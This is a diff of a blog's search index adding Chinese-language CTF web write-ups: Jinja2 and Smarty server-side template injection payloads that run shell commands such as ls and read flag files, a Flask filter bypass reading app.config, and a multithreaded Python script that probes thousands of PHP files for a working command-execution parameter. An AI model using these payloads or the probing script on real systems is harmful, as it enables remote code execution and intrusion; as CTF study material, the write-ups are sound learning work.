+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;ls&#x27;).read()&quot;</span>)&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span> ?flag=</span><br><span class="line">&#123;&#123;<span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()[<span class="number">75</span>].__init__.__globals__.__builtins__[<span class="string">&#x27;eval&#x27;</span>](<span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat flag&#x27;).read()&quot;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>方法4 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> ?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;ls&#x27;</span>).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"><span class="number">2.</span>?flag=&#123;&#123;config.__class__.__init__.__globals__[<span class="string">&#x27;os&#x27;</span>].popen(<span class="string">&#x27;cat flag&#x27;</span>).read()&#125;&#125; </span><br></pre></td></tr></table></figure></li>
+</ul>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>Jinjia2</tag>
+        <tag>Flask</tag>
       </tags>
   </entry>
   <entry>
@@ -861,6 +999,37 @@
       <tags>
         <tag>python</tag>
         <tag>pickle</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>bugku_聪明的php</title>
+    <url>/2022/04/05/bugku_%E8%81%AA%E6%98%8E%E7%9A%84php/</url>
+    <content><![CDATA[<p>题目地址：https://ctf.bugku.com/challenges/detail/id/198.html</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境获得一句话提示： &gt;pass a parameter and maybe the flag file's filename is random :&gt;</p>
+<p>随便给一个参数，得到如下界面：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113111.png" /></p>
+<p>将代码复制出来： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);  </span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pass a parameter and maybe the flag file&#x27;s filename is random :&gt;&quot;</span>;  </span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> Smarty();  </span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123; highlight_file(<span class="string">&#x27;index.php&#x27;</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> <span class="keyword">AS</span> <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)  </span><br><span class="line">    &#123;  </span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;  </span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&quot;/flag|\/flag/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">        &#125;<span class="keyword">elseif</span>(preg_match(<span class="string">&quot;/system|readfile|gz|exec|eval|cat|assert|file|fgets/i&quot;</span>, <span class="variable">$value</span>))&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&#x27;./template.html&#x27;</span>);              </span><br><span class="line">              </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123; <span class="variable">$smarty</span>-&gt;display(<span class="string">&quot;eval:&quot;</span>.<span class="variable">$value</span>);  </span><br><span class="line">        &#125;  </span><br><span class="line">          </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>发现关键词<code>smarty</code>。 # 解题 本题已知模板引擎为SSTI，那么接下来就应该判断以下版本 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;$smarty.version&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113325.png" /></p>
+<p>版本为3.1。</p>
+<p>那么<a href="https://hdfzzf.icu/2022/04/05/Smarty模板注入/">Smarty模板注入</a>中的常规利用、{literal}标签、静态方法都无法使用，那只能使用{if}标签和命令执行。</p>
+<h2 id="命令执行">命令执行</h2>
+<p>查找flag的路径： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405113844.png" /></p>
+<p>根据最开始的提示，flag的文件名是随机取得，因此判断红框就是flag文件。</p>
+<p>接着需要读取flag（注意cat被过滤了）： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?a=&#123;passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114505.png" /></p>
+<h2 id="if标签">{if}标签</h2>
+<p>其实和命令执行没什么不同。payload如下： <figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;ls /&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line"><span class="number">2</span>. ?a=&#123;<span class="keyword">if</span> passthru(<span class="string">&#x27;tac /_9764&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405114645.png" /></p>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>Smarty</tag>
       </tags>
   </entry>
   <entry>
@@ -1393,6 +1562,65 @@
       </tags>
   </entry>
   <entry>
+    <title>强网杯 2019 高明的黑客</title>
+    <url>/2022/03/29/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
+    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
+<span id="more"></span>
+<h1 id="题目信息">题目信息</h1>
+<p>进入环境，得到如下信息</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329083958.png" /></p>
+<p>因此访问如下网址，将源码下载下来 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://12e408b2-7b34-441d-a3f5-a689f716cfd5.node4.buuoj.cn:81/www.tar.gz</span><br></pre></td></tr></table></figure></p>
+<p>发现有 3002 个文件，并且除了一个 <code>index.html</code> 之外，其他的文件里面充斥着 <code>$_GET</code> <code>$_POST</code> <code>system</code> ，一看就是命令执行，但是随便打开文件，拿出一个尝试却不行。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084335.png" /></p>
+<p>因此认为，这3000+文件里面，只有一个文件的一个 payload 是有效的，其他的文件和 payload 只不过是这个 “高明的黑客” 弄出来的伪装。</p>
+<h1 id="解题">解题</h1>
+<p>3000多文件，手动验证肯定是不可能的，因此使用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, os, re, time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, as_completed</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/BUUtest/src/&#x27;</span></span><br><span class="line">filePath = <span class="string">&#x27;D:\\phpStudy2018\\PHPTutorial\\WWW\\BUUtest\\src\\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">file</span>):</span></span><br><span class="line">    pattern = <span class="string">&quot;(\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\]&quot;</span></span><br><span class="line">    gets = []</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在尝试 <span class="subst">&#123;file&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath+file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.readlines()</span><br><span class="line">    <span class="comment"># 找出所有的 (\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\] 中的单引号的内容，即参数</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        s = re.search(pattern, line)</span><br><span class="line">        <span class="keyword">if</span> s:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;GET&quot;</span> <span class="keyword">in</span> s.group():</span><br><span class="line">                gets.append(s.group(<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                posts.append(s.group(<span class="number">2</span>))</span><br><span class="line">        <span class="comment"># print(gets)</span></span><br><span class="line">        <span class="comment"># print(posts)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;echo &quot;success!!!&quot;&#x27;</span></span><br><span class="line">    <span class="comment"># 开始发送 GET 请求</span></span><br><span class="line">    <span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">        newUrl = url + file + <span class="string">&quot;?&quot;</span> + get + <span class="string">&quot;=&quot;</span> + payload</span><br><span class="line">        <span class="comment"># print(newUrl)</span></span><br><span class="line">        r = requests.get(newUrl)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is get and payload is <span class="subst">&#123;get&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 开始发送 POST 请求</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> posts:</span><br><span class="line">        newUrl = url + file</span><br><span class="line">        r = requests.post(newUrl, data=&#123;post: payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is post and payload is <span class="subst">&#123;post&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序开始：&quot;</span>)</span><br><span class="line">    fileNames = os.listdir(filePath)</span><br><span class="line">    startTime = time.time()</span><br><span class="line">    executor = ThreadPoolExecutor(<span class="number">100</span>)</span><br><span class="line">    all_tasks = [executor.submit(exp, file) <span class="keyword">for</span> file <span class="keyword">in</span> fileNames]</span><br><span class="line">    wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;total time is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(endTime - startTime)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序结束！&quot;</span>)</span><br></pre></td></tr></table></figure></p>
+<p>这是最终版的脚本。之前用的单线程，可能跑一天都跑不出来，如果开启多线程，BUUOJ这个网址就会返回 <code>too many requests</code> 。因此最终的解决办法就是在自己主机上搭建环境，然后测试。</p>
+<p>最终结果：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084725.png" /></p>
+<p>最终跑了3个多小时，由于我代码能力差，因为如果各位有更好的优化方法可以告诉我。</p>
+<p>拿到 <code>文件</code> <code>payload</code> <code>提交办法</code> 后就可以命令执行了。（这里是 GET 方式，所以无法用蚁剑连接，在自己主机上测试过）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /xk0SzyKwfzw.php?Efa5BVG=ls / # 查看根目录文件，发现 flag</span><br><span class="line">2. /xk0SzyKwfzw.php?Efa5BVG=cat /flag # flag get</span><br></pre></td></tr></table></figure>
+<h1 id="总结">总结</h1>
+<p>本题考察的并不是代码审计，而是脚本编写能力。不论怎么说，还真是一道有意思的题目呀。</p>
+]]></content>
+      <categories>
+        <category>CTF</category>
+      </categories>
+      <tags>
+        <tag>Python</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>攻防世界_shrine</title>
+    <url>/2022/04/05/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C_shrine/</url>
+    <content><![CDATA[<p>题目地址：https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5422&amp;page=1</p>
+<span id="more"></span>
+<h1 id="题目信息">1 题目信息</h1>
+<p>进入环境会看到一堆代码，是无序的，但是查看页面源码就会得到整齐的代码： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> flask</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = flask.Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;FLAG&#x27;</span>] = os.environ.pop(<span class="string">&#x27;FLAG&#x27;</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__).read()</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/shrine/&lt;path:shrine&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shrine</span>(<span class="params">shrine</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">safe_jinja</span>(<span class="params">s</span>):</span></span><br><span class="line">        s = s.replace(<span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;&#x27;</span>).replace(<span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        blacklist = [<span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;self&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join([<span class="string">&#x27;&#123;&#123;% set &#123;&#125;=None%&#125;&#125;&#x27;</span>.<span class="built_in">format</span>(c) <span class="keyword">for</span> c <span class="keyword">in</span> blacklist]) + s</span><br><span class="line">    <span class="keyword">return</span> flask.render_template_string(safe_jinja(shrine))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure></p>
+<ul>
+<li>第一，由<code>app.config['FLAG'] = os.environ.pop('FLAG')</code>，知道flag在<code>app.config['FLAG']</code>里；</li>
+<li>第二可以访问/shrine/xxx；</li>
+<li>第三，<code>(, ), config, self</code>被禁用，那么传统的模板注入就不行了。</li>
+</ul>
+<p>查看是否存在SSTI：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. shrine/$&#123;7*7&#125; # 结果 $&#123;7*7&#125;</span><br><span class="line">2. shrine/&#123;&#123;7*7&#125;&#125; # 结果 49</span><br><span class="line">3. shrine/&#123;&#123;7*&#x27;7&#x27;&#125;&#125; # 结果 7777777</span><br></pre></td></tr></table></figure>
+<p>存在SSTI，并且模板引擎为Jinjia2或者flask。</p>
+<h1 id="解题">2 解题</h1>
+<p>这里因为过滤了传统SSTI所必须的一些字符，因此得使用其他办法。又因为flag在环境变量中，考虑直接读取。</p>
+<p>读取内容。 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span> &#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br><span class="line"><span class="number">2.</span> &#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config[<span class="string">&#x27;FLAG&#x27;</span>]&#125;&#125;</span><br></pre></td></tr></table></figure></p>
+<p>直接得到flag：</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220405155128.png" /></p>
+]]></content>
+      <categories>
+        <category>SSTI</category>
+      </categories>
+      <tags>
+        <tag>Jinjia2</tag>
+        <tag>Flask</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>第1周：Vulnhub Socialnetwork writeup</title>
     <url>/2022/03/27/%E7%AC%AC1%E5%91%A8%EF%BC%9AVulnhub%20Socialnetwork%20writeup/</url>
     <content><![CDATA[<p>这是白帽学苑的课程——30周打靶的第一周，该靶机难度中等。将内网渗透过程中的主要知识点都涉及了，质量非常高。</p>
@@ -1695,36 +1923,6 @@
       <tags>
         <tag>综合</tag>
         <tag>vulnhub</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>强网杯 2019 高明的黑客</title>
-    <url>/2022/03/29/%E5%BC%BA%E7%BD%91%E6%9D%AF%202019%20%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/</url>
-    <content><![CDATA[<p>BUUCTF 网址：https://buuoj.cn/challenges</p>
-<span id="more"></span>
-<h1 id="题目信息">题目信息</h1>
-<p>进入环境，得到如下信息</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329083958.png" /></p>
-<p>因此访问如下网址，将源码下载下来 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://12e408b2-7b34-441d-a3f5-a689f716cfd5.node4.buuoj.cn:81/www.tar.gz</span><br></pre></td></tr></table></figure></p>
-<p>发现有 3002 个文件，并且除了一个 <code>index.html</code> 之外，其他的文件里面充斥着 <code>$_GET</code> <code>$_POST</code> <code>system</code> ，一看就是命令执行，但是随便打开文件，拿出一个尝试却不行。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084335.png" /></p>
-<p>因此认为，这3000+文件里面，只有一个文件的一个 payload 是有效的，其他的文件和 payload 只不过是这个 “高明的黑客” 弄出来的伪装。</p>
-<h1 id="解题">解题</h1>
-<p>3000多文件，手动验证肯定是不可能的，因此使用脚本： <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, os, re, time</span><br><span class="line"><span class="keyword">from</span> concurrent.futures <span class="keyword">import</span> ThreadPoolExecutor, wait, ALL_COMPLETED, as_completed</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://127.0.0.1/BUUtest/src/&#x27;</span></span><br><span class="line">filePath = <span class="string">&#x27;D:\\phpStudy2018\\PHPTutorial\\WWW\\BUUtest\\src\\&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>(<span class="params">file</span>):</span></span><br><span class="line">    pattern = <span class="string">&quot;(\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\]&quot;</span></span><br><span class="line">    gets = []</span><br><span class="line">    posts = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;正在尝试 <span class="subst">&#123;file&#125;</span>:&quot;</span>)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(filePath+file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        content = f.readlines()</span><br><span class="line">    <span class="comment"># 找出所有的 (\$_POST|\$_GET)\[&#x27;(.*?)&#x27;\] 中的单引号的内容，即参数</span></span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> content:</span><br><span class="line">        s = re.search(pattern, line)</span><br><span class="line">        <span class="keyword">if</span> s:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;GET&quot;</span> <span class="keyword">in</span> s.group():</span><br><span class="line">                gets.append(s.group(<span class="number">2</span>))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                posts.append(s.group(<span class="number">2</span>))</span><br><span class="line">        <span class="comment"># print(gets)</span></span><br><span class="line">        <span class="comment"># print(posts)</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">&#x27;echo &quot;success!!!&quot;&#x27;</span></span><br><span class="line">    <span class="comment"># 开始发送 GET 请求</span></span><br><span class="line">    <span class="keyword">for</span> get <span class="keyword">in</span> gets:</span><br><span class="line">        newUrl = url + file + <span class="string">&quot;?&quot;</span> + get + <span class="string">&quot;=&quot;</span> + payload</span><br><span class="line">        <span class="comment"># print(newUrl)</span></span><br><span class="line">        r = requests.get(newUrl)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is get and payload is <span class="subst">&#123;get&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="comment"># 开始发送 POST 请求</span></span><br><span class="line">    <span class="keyword">for</span> post <span class="keyword">in</span> posts:</span><br><span class="line">        newUrl = url + file</span><br><span class="line">        r = requests.post(newUrl, data=&#123;post: payload&#125;)</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="comment"># print(r.text)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;success&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;find it! filename is <span class="subst">&#123;file&#125;</span>, method is post and payload is <span class="subst">&#123;post&#125;</span>&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序开始：&quot;</span>)</span><br><span class="line">    fileNames = os.listdir(filePath)</span><br><span class="line">    startTime = time.time()</span><br><span class="line">    executor = ThreadPoolExecutor(<span class="number">100</span>)</span><br><span class="line">    all_tasks = [executor.submit(exp, file) <span class="keyword">for</span> file <span class="keyword">in</span> fileNames]</span><br><span class="line">    wait(all_tasks, return_when=ALL_COMPLETED)</span><br><span class="line">    endTime = time.time()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;total time is &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">str</span>(endTime - startTime)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;程序结束！&quot;</span>)</span><br></pre></td></tr></table></figure></p>
-<p>这是最终版的脚本。之前用的单线程，可能跑一天都跑不出来，如果开启多线程，BUUOJ这个网址就会返回 <code>too many requests</code> 。因此最终的解决办法就是在自己主机上搭建环境，然后测试。</p>
-<p>最终结果：</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220329084725.png" /></p>
-<p>最终跑了3个多小时，由于我代码能力差，因为如果各位有更好的优化方法可以告诉我。</p>
-<p>拿到 <code>文件</code> <code>payload</code> <code>提交办法</code> 后就可以命令执行了。（这里是 GET 方式，所以无法用蚁剑连接，在自己主机上测试过）</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. /xk0SzyKwfzw.php?Efa5BVG=ls / # 查看根目录文件，发现 flag</span><br><span class="line">2. /xk0SzyKwfzw.php?Efa5BVG=cat /flag # flag get</span><br></pre></td></tr></table></figure>
-<h1 id="总结">总结</h1>
-<p>本题考察的并不是代码审计，而是脚本编写能力。不论怎么说，还真是一道有意思的题目呀。</p>
-]]></content>
-      <categories>
-        <category>CTF</category>
-      </categories>
-      <tags>
-        <tag>Python</tag>
       </tags>
   </entry>
   <entry>
